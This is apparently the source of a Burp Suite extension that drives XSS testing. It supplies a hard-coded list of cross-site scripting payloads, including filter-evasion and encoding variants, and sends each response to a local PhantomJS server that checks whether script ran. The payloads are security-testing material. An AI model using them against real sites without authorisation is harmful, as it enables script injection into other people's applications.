package burp;
import burp.*;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicHeader;
import org.apache.http.util.EntityUtils;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import org.apache.commons.codec.binary.Base64;


public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor	{
	public burp.IBurpExtenderCallbacks mCallbacks;
	private IExtensionHelpers helpers;
	private PrintWriter stdout;
    private PrintWriter stderr;
    
    private HttpClient client;
    
    private static String phantomServer = "http://127.0.0.1:8093";
	
    /**
     * Initial Payloads. Will add capability to load from file
     */
	public static final byte[][] PAYLOADS = {
		"<script>alert('f7sdgfjFpoG')</script>".getBytes(),
		"<SCRIPT>alert('f7sdgfjFpoG');</SCRIPT>".getBytes(),
		"'';!--\"<f7sdgfjFpoG>=&{()}".getBytes(),
		"<IMG SRC=\"javascript:alert('f7sdgfjFpoG');\">".getBytes(),
		"<IMG SRC=javascript:alert('f7sdgfjFpoG')>".getBytes(),
		"<IMG SRC=JaVaScRiPt:alert('f7sdgfjFpoG')>".getBytes(),
		"<IMG SRC=javascript:alert(&quot;f7sdgfjFpoG&quot;)>".getBytes(),
		"<IMG SRC=`javascript:alert(\"RSnake says, 'f7sdgfjFpoG'\")`>".getBytes(),
		"<IMG SRC=\"jav	ascript:alert('f7sdgfjFpoG');\">".getBytes(),
		"<IMG SRC=\"jav&#x09;ascript:alert('f7sdgfjFpoG');\">".getBytes(),
		"<IMG SRC=\"jav&#x0A;ascript:alert('f7sdgfjFpoG');\">".getBytes(),
		"<IMG SRC=\"jav&#x0D;ascript:alert('f7sdgfjFpoG');\">".getBytes(),
		"<IMG SRC=\" &#14;  javascript:alert('f7sdgfjFpoG');\">".getBytes(),
		"<IMG SRC=java%00script:alert(\\\"f7sdgfjFpoG\\\")>".getBytes(),
		"<SCR%00IPT>alert(\\\"f7sdgfjFpoG\\\")</SCR%00IPT>".getBytes(),
		"<IMG SRC=\"javascript:alert('f7sdgfjFpoG')\"".getBytes(),
		"<SCRIPT>a=/f7sdgfjFpoG/".getBytes(),
		"\\\";alert('f7sdgfjFpoG');//".getBytes(),
		"<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('f7sdgfjFpoG');\">".getBytes(),
		"<BODY BACKGROUND=\"javascript:alert('f7sdgfjFpoG')\">".getBytes(),
		"<BODY ONLOAD=alert('f7sdgfjFpoG')>".getBytes(),
		"<IMG DYNSRC=\"javascript:alert('f7sdgfjFpoG')\">".getBytes(),
		"<IMG LOWSRC=\"javascript:alert('f7sdgfjFpoG')\">".getBytes(),
		"<BGSOUND SRC=\"javascript:alert('f7sdgfjFpoG');\">".getBytes(),
		"<BR SIZE=\"&{alert('f7sdgfjFpoG')}\">".getBytes(),
		"<LINK REL=\"stylesheet\" HREF=\"javascript:alert('f7sdgfjFpoG');\">".getBytes(),
		"<IMG SRC='vbscript:msgbox(\"f7sdgfjFpoG\")'>".getBytes(),
		"<IMG SRC=\"mocha:[code]\">".getBytes(),
		"<IMG SRC=\"livescript:[code]\">".getBytes(),
		"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('f7sdgfjFpoG');\">".getBytes(),
		"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">".getBytes(),
		"<META HTTP-EQUIV=\"Link\" Content=\"<javascript:alert('f7sdgfjFpoG')>; REL=stylesheet\">".getBytes(),
		"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('f7sdgfjFpoG');\">".getBytes(),
		"<IFRAME SRC=\"javascript:alert('f7sdgfjFpoG');\"></IFRAME>".getBytes(),
		"<FRAMESET><FRAME SRC=\"javascript:alert('f7sdgfjFpoG');\"></FRAMESET>".getBytes(),
		"<TABLE BACKGROUND=\"javascript:alert('f7sdgfjFpoG')\">".getBytes(),
		"<DIV STYLE=\"background-image: url(javascript:alert('f7sdgfjFpoG'))\">".getBytes(),
		"<DIV STYLE=\"background-image: url(&#1;javascript:alert('f7sdgfjFpoG'))\">".getBytes(),
		"<DIV STYLE=\"width: expression(alert('f7sdgfjFpoG'));\">".getBytes(),
		"<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"f7sdgfjFpoG\")';</STYLE>".getBytes(),
		"<IMG STYLE=\"f7sdgfjFpoG:expr/*f7sdgfjFpoG*/ession(alert('f7sdgfjFpoG'))\">".getBytes(),
		"<f7sdgfjFpoG STYLE=\"f7sdgfjFpoG:expression(alert('f7sdgfjFpoG'))\">".getBytes(),
		"exp/*<f7sdgfjFpoG STYLE='no\\f7sdgfjFpoG:nof7sdgfjFpoG(\"*//*\");".getBytes(),
		"<STYLE TYPE=\"text/javascript\">alert('f7sdgfjFpoG');</STYLE>".getBytes(),
		"<STYLE>.f7sdgfjFpoG{background-image:url(\"javascript:alert('f7sdgfjFpoG')\");}</STYLE><A CLASS=f7sdgfjFpoG></A>".getBytes(),
		"<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('f7sdgfjFpoG')\")}</STYLE>".getBytes(),
		"<BASE HREF=\"javascript:alert('f7sdgfjFpoG');//\">".getBytes(),
		"<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('f7sdgfjFpoG')></OBJECT>".getBytes(),
		"getURL(\"javascript:alert('f7sdgfjFpoG')\")".getBytes(),
		"a=\"get\";".getBytes(),
		"<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas<![CDATA[cript:alert('f7sdgfjFpoG');\">".getBytes(),
		"<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('f7sdgfjFpoG')&lt;/SCRIPT&gt;\">".getBytes(),
		"<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('f7sdgfjFpoG');+ADw-/SCRIPT+AD4-".getBytes(),
	};
	
	
	public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
		mCallbacks = callbacks;
		
		this.client = HttpClientBuilder.create().build();
		helpers = callbacks.getHelpers();
		callbacks.setExtensionName("XSS Validator Payloads");
		stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);
		callbacks.registerIntruderPayloadGeneratorFactory(this);
		callbacks.registerIntruderPayloadProcessor(this);
		callbacks.registerHttpListener(this);
	}
	
	@Override
	public String getGeneratorName() {
		return "XSS Validator Payloads";
	}
	
	@Override
    public IIntruderPayloadGenerator createNewInstance(IIntruderAttack attack)
    {
        // return a new IIntruderPayloadGenerator to generate payloads for this attack
        return new IntruderPayloadGenerator();
    }

    //
    // implement IIntruderPayloadProcessor
    //
    
    @Override
    public String getProcessorName() {
        return "XSS Validator";
    }
    
    @Override
    public byte[] processPayload(byte[] currentPayload, byte[] originalPayload, byte[] baseValue) {
    	return helpers.stringToBytes(helpers.urlEncode(helpers.bytesToString(currentPayload)));
    }
    
	public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if (toolFlag == 32 && messageIsRequest) {
        	// Manipulate intruder request, if necessary
        } else if (toolFlag == 32 && ! messageIsRequest) {
        	stdout.println("Response Received");
        	HttpPost PhantomJs = new HttpPost(phantomServer);
        	
        	try {
        		byte[] encodedBytes = Base64.encodeBase64(messageInfo.getResponse());
        		String encodedResponse = helpers.bytesToString(encodedBytes);
        		
	        	List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(1);
	        	nameValuePairs.add(new BasicNameValuePair("http-response", encodedResponse));
	        	
	        	PhantomJs.setEntity(new UrlEncodedFormEntity(nameValuePairs));

	        	HttpResponse response = client.execute(PhantomJs);
	        	String responseAsString = EntityUtils.toString(response.getEntity());
	            
            	stdout.println("Response: " + responseAsString);
            	
	            // parse response for XSS
	            if(responseAsString.contains("message")) {
	            	// Append weird string to identify XSS
		            String newResponse = helpers.bytesToString(messageInfo.getResponse()) + "fy7sdufsuidfhuisdf";
	            	messageInfo.setResponse(helpers.stringToBytes(newResponse));
	            	stdout.println("XSS Found");
	            }
	            
        	} catch (Exception e) {
        		stderr.println(e.getMessage());
        	}
        }
	}
		
	class IntruderPayloadGenerator implements IIntruderPayloadGenerator {
		int payloadIndex;
		
		@Override
		public boolean hasMorePayloads() {
			return payloadIndex < PAYLOADS.length;
		}
		
		@Override
		public byte[] getNextPayload(byte[] baseValue) {			
			byte[] payload = PAYLOADS[payloadIndex];
			payloadIndex++;
			return payload;
		}
		
		@Override
		public void reset() {
			payloadIndex = 0;
		}
		
	}
}
